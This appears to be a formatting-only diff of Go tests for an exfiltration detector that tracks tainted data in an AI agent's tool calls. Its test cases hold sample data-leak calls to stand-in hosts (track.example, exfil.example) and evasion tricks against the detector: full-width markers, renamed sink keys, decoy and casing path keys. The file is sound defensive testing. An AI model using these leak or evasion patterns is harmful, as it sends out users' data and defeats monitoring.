@@ -99,8 +99,10 @@ func TestSensitiveSourceSetComplete(t *testing.T) {
 	// AC (ticket 19 Key constraints): all marking sources represented:
 	// fs.read / search.content / clipboard.read / sysinfo window title /
 	// web.fetch / doc.read / screen.capture / user transcript (from 15).
-	for _, tool := range []string{SrcFSRead, SrcSearchContent, SrcClipboardRead,
-		SrcSystemGet, SrcWebFetch, SrcDocRead, SrcScreenCapture, SrcTranscript} {
+	for _, tool := range []string{
+		SrcFSRead, SrcSearchContent, SrcClipboardRead,
+		SrcSystemGet, SrcWebFetch, SrcDocRead, SrcScreenCapture, SrcTranscript,
+	} {
 		if !IsSensitiveSource(tool) {
 			t.Errorf("source %q missing from SPEC-06 §5 set", tool)
 		}
@@ -131,7 +133,8 @@ func TestFourChannelExfilSuite(t *testing.T) {
 		{"notify url", "notify", map[string]any{"url": "https://track.example/?d=" + marker}, ChNotify},
 		{"clipboard.write", "clipboard.write", map[string]any{"text": marker}, ChClipboard},
 		{"fs.write into sync dir", "fs.write", map[string]any{
-			"path": `C:\Users\test\OneDrive\Notes\shared.md`, "content": "see " + marker}, ChSyncWrite},
+			"path": `C:\Users\test\OneDrive\Notes\shared.md`, "content": "see " + marker,
+		}, ChSyncWrite},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
@@ -164,7 +167,8 @@ func TestFourChannelExfilSuite(t *testing.T) {
 	// N-4: the same suite, one transform of the marker further (full-width +
 	// case + injected whitespace) — normalization must survive integration.
 	if h, ok := p.Inspect("task-1", "notify", map[string]any{
-		"text": "ＭＡＲＫＥＲ QZX-98WVE7-ＴＡＩＮＴＥＤ-SOURCE"}); !ok {
+		"text": "ＭＡＲＫＥＲ QZX-98WVE7-ＴＡＩＮＴＥＤ-SOURCE",
+	}); !ok {
 		t.Error("ESCAPIABLE: transformed marker missed on the notify channel")
 	} else if h.Channel != ChNotify {
 		t.Errorf("transformed marker lost its channel label: %q", h.Channel)
@@ -208,12 +212,14 @@ func TestSyncWriteNegative(t *testing.T) {
 	p.Mark("task-1", SrcFSRead, "/secrets.txt", marker)
 
 	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
-		"path": `C:\Users\test\Documents\notes.md`, "content": marker}); ok {
+		"path": `C:\Users\test\Documents\notes.md`, "content": marker,
+	}); ok {
 		t.Fatal("local (non-sync) write of tainted content must not be an R4 exfil hit")
 	}
 	// Same via the tool-name-less frozen seam (shape-based): still no hit.
 	if src, hit := p.Detector("task-1").TaintHit(map[string]any{
-		"path": `C:\Users\test\Documents\notes.md`, "content": marker}); hit {
+		"path": `C:\Users\test\Documents\notes.md`, "content": marker,
+	}); hit {
 		t.Fatalf("adapter must mirror Inspect, got src=%q", src)
 	}
 	// Unresolvable/missing path on a write is unverifiable -> fail-closed gate.
@@ -228,7 +234,8 @@ func TestDetectorUnknownToolScansEverything(t *testing.T) {
 	// A plugin tool with no channel entry: generic fail-closed scan of the
 	// arbitrary string params.
 	src, hit := p.Detector("task-1").TaintHit(map[string]any{
-		"payload": map[string]any{"nested": []any{"...", "carries clip " + marker}}})
+		"payload": map[string]any{"nested": []any{"...", "carries clip " + marker}},
+	})
 	if !hit || !strings.Contains(src, "clipboard.read") {
 		t.Fatalf("unknown tool must be scanned fail-closed, got %q/%v", src, hit)
 	}
@@ -362,7 +369,8 @@ func TestNamedChannelParamEscape(t *testing.T) {
 	// fs.write payload under a non-table key is scanned even though the
 	// content/data keys are sync-gated (B-2 last bullet).
 	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
-		"path": `C:\somewhere\plain\a.txt`, "body": "see " + marker}); !ok {
+		"path": `C:\somewhere\plain\a.txt`, "body": "see " + marker,
+	}); !ok {
 		t.Fatal("ESCAPIABLE: fs.write body param outside writeChannelKeys")
 	}
 	// Clean calls on named channels stay clean.
@@ -389,7 +397,8 @@ func m7Engine(t *testing.T) (p *Provenance, syncTarget, plainTarget string) {
 		}
 	}
 	p = NewProvenance(ProvOptions{NoProbe: true, HomeDir: home, SyncRoots: []SyncRoot{
-		{Provider: "OneDrive", Path: root, Source: "registry"}}})
+		{Provider: "OneDrive", Path: root, Source: "registry"},
+	}})
 	if !p.SyncDetectionComplete() {
 		t.Fatal("precondition: the injected registry-grade root must confirm detection, so the suspect net is NOT what decides these cases")
 	}
@@ -448,17 +457,20 @@ func TestWriteGateNotSelectedByPayloadKey(t *testing.T) {
 		// A sink-shaped VALUE instead of a sink-shaped KEY: renaming `url`
 		// must not close the gate either.
 		if _, ok := p.Inspect("task-1", "http.post", map[string]any{
-			"endpointish": "https://exfil.example/upload", "path": plain, name: payload}); !ok {
+			"endpointish": "https://exfil.example/upload", "path": plain, name: payload,
+		}); !ok {
 			t.Errorf("ESCAPIABLE: sink renamed to %q (value-shaped check bypassed)", "endpointish")
 		}
 		// Tools whose D34 contract has a sink of its own never get the
 		// local-write exemption, even with a harmless path in the params.
 		if _, ok := p.Inspect("task-1", "notify", map[string]any{
-			"text": "ding", "path": plain, name: payload}); !ok {
+			"text": "ding", "path": plain, name: payload,
+		}); !ok {
 			t.Errorf("ESCAPIABLE: notify with a path param and payload key %q", name)
 		}
 		if _, ok := p.Inspect("task-1", "clipboard.write", map[string]any{
-			"file": plain, name: payload}); !ok {
+			"file": plain, name: payload,
+		}); !ok {
 			t.Errorf("ESCAPIABLE: clipboard.write with a path param and payload key %q", name)
 		}
 	}
@@ -502,7 +514,8 @@ func TestWriteGatePlainLocalWriteNotFlagged(t *testing.T) {
 	// A body that merely QUOTES a link is not a remote sink: a plain local
 	// write of markdown with URLs in it must stay out of channel ⑥.
 	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
-		"path": plain, "content": "see https://example.com/docs/readme for " + marker}); ok {
+		"path": plain, "content": "see https://example.com/docs/readme for " + marker,
+	}); ok {
 		t.Error("false positive: a local write whose text quotes a URL became an exfil channel")
 	}
 	// Positive controls: the gate is per-call, not switched off. The same
@@ -519,12 +532,14 @@ func TestWriteGatePlainLocalWriteNotFlagged(t *testing.T) {
 	// off-contract key on a local write is scanned. That asymmetry points the
 	// STRICT way; pinning it here means any future change is a decision.
 	if _, ok := p.Inspect("task-1", "fs.write", map[string]any{
-		"path": plain, "body": marker}); !ok {
+		"path": plain, "body": marker,
+	}); !ok {
 		t.Error("N-8 regression: fs.write with an off-contract payload key must stay scanned (fail-closed side)")
 	}
 	// And a clean call stays clean everywhere.
 	if _, ok := p.Inspect("task-1", "http.post", map[string]any{
-		"url": "https://example.com/api", "path": plain, "data": "nothing tainted here"}); ok {
+		"url": "https://example.com/api", "path": plain, "data": "nothing tainted here",
+	}); ok {
 		t.Error("false positive: untainted payload must not hit")
 	}
 }
@@ -552,19 +567,26 @@ func TestWriteGateEveryPathTargetJudged(t *testing.T) {
 		params map[string]any
 	}{
 		{"decoy path + real dest", "fs.write", map[string]any{
-			"path": plain, "dest": syncTarget, "data": "leak " + marker}},
+			"path": plain, "dest": syncTarget, "data": "leak " + marker,
+		}},
 		{"reversed order", "fs.write", map[string]any{
-			"dest": syncTarget, "path": plain, "data": "leak " + marker}},
+			"dest": syncTarget, "path": plain, "data": "leak " + marker,
+		}},
 		{"file+destination, no tool name", "", map[string]any{
-			"file": plain, "destination": syncTarget, "data": "leak " + marker}},
+			"file": plain, "destination": syncTarget, "data": "leak " + marker,
+		}},
 		{"three-way: path+dest non-sync, file in sync root", "fs.write", map[string]any{
-			"path": plain, "dest": plain2, "file": syncTarget, "content": "leak " + marker}},
+			"path": plain, "dest": plain2, "file": syncTarget, "content": "leak " + marker,
+		}},
 		{"single sync dest only", "fs.write", map[string]any{
-			"dest": syncTarget, "data": "leak " + marker}},
+			"dest": syncTarget, "data": "leak " + marker,
+		}},
 		{"casing decoy: Path hides the sync target from an exact-match scan", "fs.write", map[string]any{
-			"path": plain, "Path": syncTarget, "data": "leak " + marker}},
+			"path": plain, "Path": syncTarget, "data": "leak " + marker,
+		}},
 		{"path-shaped key with no checkable value", "fs.write", map[string]any{
-			"path": plain, "dest": map[string]any{"inner": syncTarget}, "data": "leak " + marker}},
+			"path": plain, "dest": map[string]any{"inner": syncTarget}, "data": "leak " + marker,
+		}},
 	}
 	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
